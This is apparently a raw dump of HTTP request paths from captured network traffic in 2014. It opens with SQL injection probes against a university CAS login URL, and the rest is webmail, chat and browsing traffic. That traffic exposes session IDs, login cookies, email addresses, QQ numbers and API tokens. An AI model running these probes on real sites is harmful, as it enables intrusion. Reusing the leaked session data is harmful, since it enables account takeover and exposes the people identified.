+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' ORDER BY 1#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php ORDER BY 1#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/cas/login?service=http://jxdc.hdu.edu.cn/index.php UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/p/js6/6.0b1411141811/js/product/club.js
+/p/js6/6.0b1411141811/img/nui/nui_ico_loading_xs.gif
+/external/js6public163.js
+/external/js6promote.min.js
+/p/js6/6.0b1411141811/pattern/standard/img/dock/global.png
+/ggimg/all/img19/140916_iphone.png
+/ggimg/all/img19/140916_android.png
+/ggimg/all/img19/141113_lofter.png
+/p/images/app/qingsongyike_16.png
+/ggimg/all/img18/1ydb_16.png
+/ggimg/all/img19/140916_master.png
+/m/func/img/mailrec/174/3/promPic.png
+/m/func/img/greeting/4/302/1/promPic.gif
+/newNotice.do?sid=TAxKMKwHPqgUSwkakaHHmVgfmfHNmlyK&uid=zsbpro@163.com&host=mail.163.com&ver=js6&fontface=yahei&style=1&skin=skyblue&color=064977&email=zsbpro@163.com&from=mailjs6&callback=netease.mail.base.Ajax.padding240681675377
+/mailPromote.html?verionNo=740px&customizetype=default&color=003399&from=mail9&uid=undefined&sid=TAxKMKwHPqgUSwkakaHHmVgfmfHNmlyK&host=mail.163.com&fontface=yahei&style=1&skin=skyblue
+/p/js6/lib/img/noface.gif
+/KsafeSpeedTest/ksafe/queryip.d?ip=173.194.127.231
+/p/t.gif
+/p/js6/lib/img/weather/100x100/07.png
+/channel5/017931/190360_141124.swf
+/p/dbqb/resupload/onlinepath/2014/11/27/0/cb305d375ca4956403378d99b04f57e4.jpg
+/caipiao/css2/base.css?252134
+/caipiao/js2/popularize/popularizeForMail2_new.js?252134
+/caipiao/css2/popularize/popularizeForMail2_inc.css?252134
+/caipiao/js2/jquery-1.4.2.js?252134
+/caipiao/js2/easyCore.js?252134
+/checker
+/caipiao/img/popularize/mailTab20140421/previlege1.jpg
+/sports/2014/8/12/201408121519322f899.gif
+/globalConfig.html?1417222125301&252134
+/m/lb/img/inboxBottom/144/0/promPic.jpg
+/p/js6/6.0b1411141811/pattern/standard/img/ibx/ggclose.gif
+/p/images/ibx/cx/wowcn.gif
+/mailapi/src/2.0/cross_js5_v1.js
+/p/js6/lib/img/loading.gif
+/identity/queryLoginStatus.html?cache=1417222125846
+/caipiao/js2/popularize/mail.js?252134
+/caipiao/js2/popularize/entry.js?252134
+/caipiao/js2/carousel.js?252134
+/caipiao/js2/jtip.js?252134
+/information/progress
+/abc
+/stat?mid=dde3438f58ddb4cf7dc7ad3838c67d2c&type=200&k1=1&k2=7,2,10,2070
+/embed?host=mail.163.com&sign=a64ee77567e2e0f856e850e3efbbb4f707715d758f7d890aeb54c164d1746317608bee0ca4d9302fa43f94d74664c4523a9c2e5a43e9e01acf2125df19ef7aec15ea8667648dc7f7bf30df95e9fd17a654e6395a394b08589133181cf629201c93e05c6bff9dae34da2ec325e751d0caf1aa9636479314f48cbf7d73471d17cdacf6775ec5ea7d1e19188db39e7ad5d9fc1f005287eb34649a13fb944ee6d0ac8960aad575ee7d193ae89c15abf5f77f1d54da244abee9d4663354fccbbc0a22&nick=赵世斌&clientWidth=1366&clientHeight=600
+/mailapi/webmailapi-2.8.5.min.utf8.js
+/client_security_conf
+/
+/client/act/actl.xml
+/cv?uuid=4a774ab25e8a4c0977b25e76c6d90b28&tc=1690754&p=kxescore.exe&c=1335
+/res/images/3rd/yixin-ndft.png?v=4
+/information/rank
+/mailapi/flashRequest.swf
+/poll?r=0.3350534972269088&u=815922797&s=7&k=nqyEMXtnbf6hMD8p&t=0&i=30&r=0.9715633010491729
+/p/js6/lib/img/icon_lofter.png
+/p/js6/lib/img/icon_read2.png
+/mailplayer?host=mail.163.com&uid=zsbpro@163.com&sid=TAxKMKwHPqgUSwkakaHHmVgfmfHNmlyK
+/query?1417222128
+/q
+/images/dklogo.png
+/g?b=qq&nk=248755694&s=40&t=1417196286
+/images/dksetting.png
+/images/dknewmsg.png
+/images/dkhelp.png
+/g?b=qq&nk=710002188&s=40&t=1417209589
+/Login/inner_announce
+/g?b=qq&nk=-1326865044&s=40&t=1417137822
+/query?1417222129
+/s/2/core.css?09b43d949786b6b6067f58de5870796e
+/s/2/pt_musicbox_mailplayer.css?884d707a60f9faf83db55854a060cfd3
+/style/web2/img/mail/icn-pau.png
+/s/2/core.js?143bbdbd6d1dc50acb4db13618d0ac77
+/s/2/pt_musicbox_mailplayer.js?d1bc78b276e5afa87813329fac85cf53
+/mailapi/webmailapi-2.8.7.min.utf8.js
+/mailapi/extend4musicbox.js
+/style/web2/img/mail/icn-bg.png?ceb3f2102df5e0d4c629cf827263b32d
+/style/web2/img/mail/playbox.png?ba780c02eeb010add836a42ab95866a2
+/style/web2/img/mail/vol.png?0dfa73de3edaafb5781a4671f6b89859
+/style/web2/img/mail/volicn.png?169f0a5dad53c70ba257522e299a8433
+/style/web2/img/mail/list.png?e9820843da7ba0907b397456c7f6a20b
+/query?1476767
+/mailEntry.do?blogad2=1&blog&v=6
+/style/swf/CloudMusicPlayer.swf?v=2014060988888
+/style/web2/img/mail/listhover.png?428ac4b8f9f44394dd416e11ff2f936b
+/style/web2/img/default/default_album.jpg
+/?imgurl=http://imglf2.ph.126.net/3Yh8uKJuAZNrmGSIrbL1Gg==/3832563282992413826.jpg_115x115x1.jpg
+/?imgurl=http://imglf2.ph.126.net/6a08Dy4ExGswKF1VcpKm0g==/2831356790750110115.jpg_240x150x1.jpg
+/?imgurl=http://imglf0.ph.126.net/KaLWIvICeip7yuIJbxKy3A==/6608921402492571894.jpg_240x150x1.jpg
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=126.am
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=www.lofter.com
+/setcookie.jsp?loginCookie=cqHQUQSg13eA6CmgkiSTgE4rw0ARyZ_K9JJ3.rrtEw.QhhzS8RdvBw4.whHJbaa_4.STbZj0W3zgJpzMaTObJK8.j45jbF5Ihup8ORBRtW4myWD5bR7cAtDuVefo6ynysJVj_1y0FoZzxL1YQcNm3.SUv&sInfoCookie=1417221854|0|##|934176877@qq.com&pInfoCookie=934176877@qq.com|1417221854|0|163|00&99|shd&1416499051&163#zhj&330100#10#0#0|&0||934176877@qq.com&domain=huihui.cn
+/q
+/softmgrcfg.ini?tick=0&from=SoftupNotify&m=dde3438f58ddb4cf7dc7ad3838c67d2c&ver=2.6.0.1100&
+/get_update_info.php?type=update_info&soft_ids=77,280,342,10205,10242,102405,100100507,&lrtime=0&appver=2.6.0.1100&uid=1&pid=h_home_inst_new&m=dde3438f58ddb4cf7dc7ad3838c67d2c
+/get_polls.php?mid=dde3438f58ddb4cf7dc7ad3838c67d2c
+/cms/config/up.json
+/Login/self_information
+/get_update_info.php?type=update_info&soft_id=100100507&t=1&m=dde3438f58ddb4cf7dc7ad3838c67d2c
+/index.php?c=Soft&a=info&soft_ids=100100507,&timestamp=1417222134&signature=1300e9d96e5503d3f7feae4945634b09
+/club/item/parcel/client_wording.json
+/club/item/parcel/timestamp.json
+/club/item/parcel/icon.json
+/mobilQQ_rich_status/csc/rich_status_2014-11-28_add.zip
+/KsafeSpeedTest/ksafe/queryip.d?ip=74.125.31.95
+/welcome
+/welcome/info
+/static/css/comm/info.css
+/static/image/hdu.jpg
+/3312753094/50/5673453509/1
+/static/image/HDUISA.png
+/5252497083/50/5708064524/1
+/1729883917/50/40056146081/1
+/1900982955/50/5700223473/1
+/static/image/host.png
+/static/image/host_2.png
+/static/image/host_3.png
+/static/image/tengxun.png
+/static/image/baidu.png
+/static/image/anquanbao.png
+/static/image/xipu.png
+/platform/event_refresh
+/static/image/logo-weikezhongce.png
+/static/image/logo-bowenshidian.png
+/v3/safeup_miniup64.cab?autoupdate=true&pid=h_home_haohua&uid=1&mid=115687e33b61d4b20b39b8be4358a79f&ver=9.7.0.2001&sysver=6.3.9600.256.1.0&pa=x64&type=tray&rt=1&lt=0&ue=1&language=chs
+/poll?r=0.736857834579969&u=345402597&s=7&k=-olgoDNk5WyWFNdd&t=0&i=30&r=0.5599256705987767
+/
+/static/plugins/bootstrap/css/bootstrap.min.css
+/static/css/index/welcome_page.css
+/static/image/xctf_2.png
+/static/image/toXY.png
+/static/fonts/myriad-set-pro_ultralight.woff
+/config/config.dat
+/v3/dswtb.dat/dswtb.dat.1.0.0.2666-1.0.0.2667.cab
+/p/js6/6.0b1411141811/js/product/yixin.js
+/poll?r=0.8642667883541435&u=648629762&s=7&k=H3mhqTxNAk6pJpqp&t=0&i=30&r=0.5576113974675536
+/favicon.ico
+/favicon.ico
+/p/js6/lib/swf/Zoom.swf
+/ThawtePremiumServerCA.crl
+/2/remind/unread_count.json?uid=1992245353&unread_message=1&group_id=221102260100003958&source=140226478
+/ThawteCSG2.crl
+/api/?api_key=9ff857b2b2d001d5c17447613452beeb&api_sig=7207218235bbe7ca4983730db66939d1&call_id=1417222141.785719&id=1770692697&method=Songs.detail
+/api/?access_token=8bd4605019e3111a93c092ab7f13ec1b13ce695f&api_key=9ff857b2b2d001d5c17447613452beeb&api_sig=ea7fcf5d05982d84b54605dc01e22979&call_id=1417222141.939979&id=1770692697&method=Playlog.add&time=1417222141&type=25
+/lyric/upload/97/1770692697_1324954012.lrc
+/p/images/ibx/cx/weibocom.gif
+/edgedl/update2/1.3.25.11/GoogleUpdateSetup.exe
+/edgedl/update2/1.3.25.11/GoogleUpdateSetup.exe?cms_redirect=yes&expire=1417236542&ip=218.75.123.171&ipbits=0&mm=28&ms=nvh&mt=1417221984&mv=u&shardbypass=yes&sparams=expire,ip,ipbits,mm,ms,mv,shardbypass&signature=20D26DE2AC50A103835AFAD2D1B686D112ECF653.74415B3A2D0000FF3757B12EFF332404D82008BC&key=cms1
+/Login
+/poll?r=0.7531244750134647&u=915910623&s=7&k=tslONqY336_XNnSx&t=0&i=30&r=0.7103843472432345
+/static/css/index/login_user.css
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/query?1417222150
+/poll?r=0.08221345929598056&u=332746458&s=7&k=Q7UBWSdG2k7VEzir&t=0&i=30&r=0.21935595319719992
+/
+/static/plugins/bootstrap/css/bootstrap.min.css
+/static/css/index/welcome_page.css
+/static/image/xctf_2.png
+/static/image/toXY.png
+/wp-content/plugins/akismet/_inc/form.js?ver=3.0.3
+/avatar/f948cdba1b10bb8044e9c478c815f003?s=80&d=wavatar&r=G
+/avatar/808dc9c9cfcbd3e083afb5536276c797?s=80&d=wavatar&r=G
+/avatar/8d1dad160f2ad668836e6a2315b53315?s=80&d=wavatar&r=G
+/avatar/1a70ee652b025b6facbb582844258035?s=80&d=wavatar&r=G
+/avatar/510c37a8cf322c3e3b8672e4c05565f2?s=80&d=wavatar&r=G
+/avatar/8e659d9d7e53fc3ebf8c6acbb5a64fc1?s=80&d=wavatar&r=G
+/avatar/a8dcf2aa385ae98b6404d6613e29ee74?s=80&d=wavatar&r=G
+/avatar/fa03a5d4344c6dbe8273dd98fb371771?s=80&d=wavatar&r=G
+/avatar/25ac427019176c640f028ae2ade78bf4?s=80&d=wavatar&r=G
+/wp-content/plugins/table-of-contents-plus/front.js?ver=1404
+/wp-includes/js/comment-reply.min.js?ver=4.0.1
+/wp-includes/js/jquery/ui/jquery.ui.core.min.js?ver=1.10.4
+/avatar/c6df017c640ebf3837c92089015a0f87?s=80&d=wavatar&r=G
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/wp-content/themes/customizr/inc/assets/js/modernizr.min.js?ver=3.2.8
+/wp-includes/js/jquery/ui/jquery.ui.effect.min.js?ver=1.10.4
+/avatar/ff0c008ee98d966a33046f2f0b268e05?s=80&d=wavatar&r=G
+/avatar/f486a599c9572196a9bc6cab380c1a82?s=80&d=wavatar&r=G
+/avatar/a22639f1d0d60fbc94b59cb82568e338?s=80&d=wavatar&r=G
+/avatar/a317b179483993f6a8e6d9b9cb3469fc?s=80&d=wavatar&r=G
+/wp-content/themes/customizr/inc/assets/js/retina.min.js?ver=3.2.8
+/avatar/4cd3beee6036c2dcbae69446a28640bd?s=80&d=wavatar&r=G
+/avatar/a1c35e021b79fbdd6e2fcef274a1548f?s=80&d=wavatar&r=G
+/avatar/52f011964a1f2f96d52931b8fac224b0?s=80&d=wavatar&r=G
+/information/progress
+/static/fonts/myriad-set-pro_ultralight.woff
+/avatar/a6a44ad3a2e2b63a6fb2f661b9fe6d80?s=80&d=wavatar&r=G
+/avatar/97961d6f3c1cf61c399170d86ca6ae90?s=80&d=wavatar&r=G
+/
+/avatar/cc05ea2c14a7e0822f9a57a14fd3b433?s=80&d=wavatar&r=G
+/avatar/632a3f755482d97411efa118534f0a6b?s=80&d=wavatar&r=G
+/avatar/dcae4b663e1f34f07b383a1110658f3a?s=80&d=wavatar&r=G
+/wp-content/js/devicepx-jetpack.js?ver=201448
+/avatar/6efde9a95ec3a5a1d19d5f25e07ebd96?s=80&d=wavatar&r=G
+/favicon.ico
+/ck?itn=8
+/avatar/084c74a55b4e9185bd3d49599d6b37b8?s=80&d=wavatar&r=G
+/avatar/6bcc09e90574ea27792205b861de6fa2?s=80&d=wavatar&r=G
+/avatar/5386216defd13c8ed0b0f037a2bf5393?s=80&d=wavatar&r=G
+/avatar/2a9ad01048a98cfcf085d97a97c33420?s=80&d=wavatar&r=G
+/wp-content/plugins/jetpack/images/rss/orange-medium.png
+/e-201448.js
+/Login/inner_announce
+/Login/inner_announce
+/information/rank
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/p/images/ibx/cx/baiducom.gif
+/p/images/ibx/cx/12306.gif
+/Login
+/static/css/index/login_user.css
+/information/progress
+/webservices/getUpdates.do?uid=934176877
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/platform
+/2013/11/25/how-to-fix-wired-network-interface-device-not-managed-error/?relatedposts=1&relatedposts_exclude=undefined
+/www.blackmoreops.com
+/g.gif?host=www.blackmoreops.com&rand=0.5004057846963406&v=ext&j=1:3.2.1&blog=60478163&post=505&tz=10&ref=
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/Login/self_information
+/cv?uuid=46b4d68ba5105b8ca0eef622747b0d2a&tc=1629040&p=kxetray.exe&c=0
+/
+/index.php?tn=98012088_5_dg&ch=10
+/Login/self_information
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/su?wd=&json=1&p=3&sid=10091_1448_10168_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10096_10007_10236_10256_9978_9023&req=2&cb=jQuery1102014687601570039988_1417222068942&_=1417222068943
+/cache/fpid/chromelib_1_1.js?_=1417222068944
+/home/xman/data/superload?type=weather&_req_seqid=0x97e8e4b4000704ca&asyn=1&t=1417222069165&sid=10091_1448_10168_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10096_10007_10236_10256_9978_9023
+/dev/api/?tn=playlist&special=flash&prepend=&format=json&id=public_tuijian_suibiantingting&callback=packFmLoadSongs&_=1417222069209
+/www.blackmoreops.com/wp-content/uploads/2014/03/20-things-to-do-after-installing-Kali-Linux-blackMORE-Ops.jpg?resize=350,200
+/www.blackmoreops.com/wp-content/uploads/2014/09/Connect-to-WiFi-network-in-Linux-from-command-line-Check-Routing-and-DHCP-blackMORE-Ops-8.png?resize=350,200
+/www.blackmoreops.com/wp-content/uploads/2013/12/Fix-WARNING-The-following-packages-cannot-be-authenticated-in-Kali-Linux-3-blackMORE-Ops.png.png?resize=350,200
+/data/music/fmlink?songIds=885401,8884267,3467909,14902292,5984898,10554229,528926,235749,2609746,12313691&callback=packFmLoadSongsMore&_=1417222069498
+/dev/api/?tn=usercounts&callback=packFmWriteToken&t=1417222069669
+/data2/pic/115440310/115440310.jpg
+/v.gif?pid=304&ref=radio&source=pcwidget-newindex&username=DarkDcBoy&page=baidu_home&expoitem=pcwidget&type=exposure
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/home/pack/data/fmlrc?qstr=/data2/lrc/15335692/15335692.lrc&_req_seqid=0x97e8e4b4000704ca&asyn=1&t=1417222070198&sid=10091_1448_10168_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10096_10007_10236_10256_9978_9023
+/home/xman/data/tipspluslist?_req_seqid=0x97e8e4b4000704ca&asyn=1&t=1417222070211&sid=10091_1448_10168_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10096_10007_10236_10256_9978_9023
+/v.gif?mod=superplus:skeleton&submod=skeleton&utype=&superver=superplus&portrait=74f64461726b4463426f79510d&glogid=3327220895&type=2011&pid=315&version=PCHome&terminal=PC&qid=0x97e8e4b4000704ca&sid=10091_1448_10168_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10096_10007_10236_10256_9978_9023&super_frm=&from_login=&from_reg=&query=&curcard=3&curcardtab=&_r=0.8188389830756932&m=superplus:skeleton_modShow&logactid=1100000000&showTab=3&opType=refresh
+/v.gif?mod=superplus:weather&submod=weather_tpl&utype=&superver=superplus&portrait=74f64461726b4463426f79510d&glogid=3327220895&type=2011&pid=315&version=PCHome&terminal=PC&qid=0x97e8e4b4000704ca&sid=10091_1448_10168_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10096_10007_10236_10256_9978_9023&super_frm=&from_login=&from_reg=&query=&curcard=3&curcardtab=&_r=0.6888222876004875&m=superplus:weather_weatherShow&logactid=5000000000&showType=weatherMod
+/static/flash/fmp_mp3.swf?_t=1417222069670
+/home/msg/data/personalcontent?num=8&_req_seqid=0x97e8e4b4000704ca&asyn=1&t=1417222070863&sid=10091_1448_10168_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10096_10007_10236_10256_9978_9023
+/home/xman/data/treasuretips?_req_seqid=0x97e8e4b4000704ca&asyn=1&t=1417222070866&sid=10091_1448_10168_10194_10269_9475_10121_10209_10017_10179_9499_10051_10218_10096_10007_10236_10256_9978_9023
+/cgi-bin/login?Fun=clientlogin&Uin=2410259313&K=98A75FA7700903A0255790BFECEC09F2DEAA107ADA7ED4A099D36C88ABF54573
+/poll?r=0.8902816770132631&u=815922797&s=7&k=nqyEMXtnbf6hMD8p&t=0&i=30&r=0.6850578617304564
+/square/e511fd1dgw1emqxtq1kozj20gn09cjsj.jpg
+/square/e511fd1dgw1emqxuhqaruj20go09ewf6.jpg
+/square/e511fd1dgw1emqxuizb75j20gn09d3z6.jpg
+/square/e511fd1dgw1emqxtsux3tj20go09e0ta.jpg
+/square/e511fd1dgw1emqxusotg0j20gn09daau.jpg
+/square/e511fd1dgw1emqxujjvqrj20gn09dgmk.jpg
+/square/e511fd1dgw1emqxtvfjn1j20gn09bmy3.jpg
+/square/e511fd1dgw1emqxumbdrcj20gn09bdgq.jpg
+/square/e511fd1dgw1emqxugf9rvj20gn09dt9b.jpg
+/square/e511fd1dgw1emqy3is3zxj21400mitd5.jpg
+/square/e511fd1dgw1emqy327xxij21400mi43m.jpg
+/square/e511fd1dgw1emqy33v802j21400midkq.jpg
+/square/e511fd1dgw1emqy34jl3fj21400midjz.jpg
+/square/e511fd1dgw1emqy356i0zj21400miwkr.jpg
+/square/e511fd1dgw1emqy331v9lj21400miq7y.jpg
+/square/48afe3fajw1emqws34qhdj20qo0zkn0i.jpg
+/square/48afe3fajw1emqws2k34ij20qo0zkjv7.jpg
+/cgi-bin/frame_html?sid=gPH-LI_XXPWMjQJW&r=2373d7df2e22fb99ce208bc29be0c340
+/square/48afe3fajw1emqws3kt10j20g40c0myh.jpg
+/ps_fp.htm?pid=superplus&fp=106136C80B3FDBDA36C6C75C604C4328&im=0&wf=1&br=2&qid=0x97e8e4b4000704ca&bi=43BAF1A08E4428CCD57A7A69786FAD62:FG=1
+/2304731083/50/5682856341/1
+/1841427011/50/5647870857/1
+/thumbnail/6dc1f243jw1emqwmi3713j204g02i0sk.jpg
+/thumbnail/eab03d57tw1emqvi43lf2j20ri09e40k.jpg
+/thumbnail/879a1d63gw1emqw2d6lc3j20r6080q5j.jpg
+/85151652/y0141wob81t_1.jpg
+/0100641F4654776D734BE70627E79B1E135019-2C54-21F5-A019-FC801D55A88C
+/c/msdownload/update/software/defu/2014/11/mpas-d_bd_1.189.620.0_15f509c4f957ac56e2c2c43270be8d06b19d048f.exe
+/t4/appstyle/expression/ext/normal/4e/kissboy_org.gif
+/t4/appstyle/expression/ext/normal/1b/kissgirl_org.gif
+/zh_CN/htmledition/style/comm2010220516.css
+/cgi-bin/getcss?sid=gPH-LI_XXPWMjQJW&ft=skin
+/thumbnail/4b08ac5ejw1emqvnxhcyzj20ji0pl442.jpg
+/zh_CN/htmledition/js/all220562.js
+/thumbnail/d6eb2b02gw1emqs98s8l2j211y0lcgno.jpg
+/bmiddle/eab03d57tw1emqvi43lf2j20ri09e40k.jpg
+/bmiddle/6dc1f243jw1emqwmi3713j204g02i0sk.jpg
+/bmiddle/879a1d63gw1emqw2d6lc3j20r6080q5j.jpg
+/bmiddle/4b08ac5ejw1emqvnxhcyzj20ji0pl442.jpg
+/adfront/deliver.php?posid=pos525904036078b&psid=PDPS000000052321&wbVersion=v6&uid=1731708303&cip=60.12.8.170&spr=sports.sina.com.cn&cursor=43&eData=0.53,5&callback=wbad_14173193883041&rnd=14172657841692
+/bmiddle/d6eb2b02gw1emqs98s8l2j211y0lcgno.jpg
+/large/76cc7241jw1empeu95vm3j20dc028q39.jpg
+/information/progress
+/cgi-bin/today?sid=gPH-LI_XXPWMjQJW&sid=gPH-LI_XXPWMjQJW&nocheckframe=true
+/cgi-bin/mail_list?sid=gPH-LI_XXPWMjQJW&folderid=1&folderkey=1&page=0&s=inbox&topmails=0&showinboxtop=1&ver=215944.0&cachemod=maillist&cacheage=7200&r=
+/zh_CN/htmledition/style/today220516.css
+/cgi-bin/laddr_friend?func=birthcard&hasrmd=1&t=birth_friendlist&sid=gPH-LI_XXPWMjQJW&s=todaypanel
+/qqfind/btn/tips?ldw=788498497
+/pc/getzip?offlineid=1&clientuin=617001958&clientver=5347&appid=4294967295&pubno=26373&ts=&prefetch=1
+/pc/getzip?offlineid=117&clientuin=617001958&clientver=5347&appid=10001013&pubno=26373&ts=&prefetch=1
+/pc/getzip?offlineid=121&clientuin=617001958&clientver=5347&appid=10001015&pubno=26373&ts=&prefetch=1
+/cgi-bin/getqqicon?uin=848229652&sid=gPH-LI_XXPWMjQJW&mode=newaddr
+/cgi-bin/getqqicon?uin=350353049&sid=gPH-LI_XXPWMjQJW&mode=newaddr
+/pc/misc/connect/files/20141128/8a0b8bcb49e4dae60149f525e0030009.zip
+/socket.io/1/xhr-polling/DFxgXjA3dhb42LG9pWJb?t=1417222159720
+/cgi-bin/getcomposedata?t=signature&fun=compose&sid=gPH-LI_XXPWMjQJW&qzonesign=&r=1417222160149
+/zh_CN/htmledition/js/profile_tips220516.js
+/preload/list.js?880749
+/zh_CN/htmledition/ajax_proxy.html?mail.qq.com&v=130132
+/cgi-bin/speed_report?stat=frame_html|page&3=366&4=5640&5=5640&6=5640&7=5640&8=5640&9=5640&10=5642&11=5767&12=5882&13=5769&14=6391&15=6419&16=6422&17=6903&18=6903&19=7114&_=1417222160132
+/cgi-bin/reader_unread_count?first=1&sid=gPH-LI_XXPWMjQJW&t=reader_dataInit&u=-2364342888&r=0.4620885946787894
+/ajax_proxy.html?mail.qq.com&v=110702
+/cgi-bin/getwpkey?r=0.3583716668654233&resp_charset=UTF8&ef=js&sid=gPH-LI_XXPWMjQJW
+/cgi-bin/getinvestigate?sid=gPH-LI_XXPWMjQJW
+/poll?r=0.9106923697981983&u=2410259313&s=7&k=_WBwkTIQcaOpjxGL&t=0&i=30&r=0.6755238573532552
+/favicon.ico
+/zh_CN/htmledition/js/readmail2220ac7.js
+/zh_CN/htmledition/js/compose2220ac7.js
+/www/js/common.js
+/cr?id=4&d=jsloadsuccess=v1.4|childUrl::http://mail.qq.com/cgi-bin/frame_html?sid=gPH-LI_XXPWMjQJW&r=2373d7df2e22fb99ce208bc29be0c340|parentUrl::http://mail.qq.com/cgi-bin/frame_html?sid=gPH-LI_XXPWMjQJW&r=2373d7df2e22fb99ce208bc29be0c340
+/cgi-bin/getinvestigate?sid=gPH-LI_XXPWMjQJW
+/wp-content/plugins/facebook-page-promoter-lightbox/front-assets/scs/fancybox-x.png
+/wp-content/plugins/facebook-page-promoter-lightbox/front-assets/scs/fancybox.png
+/wp-content/plugins/facebook-page-promoter-lightbox/front-assets/scs/fancybox-y.png
+/wp-content/plugins/facebook-page-promoter-lightbox/front-assets/scs/blank.gif
+/cgi-bin/laddr_domain_check?sid=gPH-LI_XXPWMjQJW&acttype=5&t=recent_group.json&sid=gPH-LI_XXPWMjQJW
+/cgi-bin/laddr_lastlist?sid=gPH-LI_XXPWMjQJW&encode_type=js&t=addr_datanew&s=AutoComplete&category=hot&resp_charset=UTF8&ef=js&r=0.6440007707569748
+/
+/information/rank
+/2/remind/unread_count.json?uid=1992245353&unread_message=1&group_id=221102260100003958&source=140226478
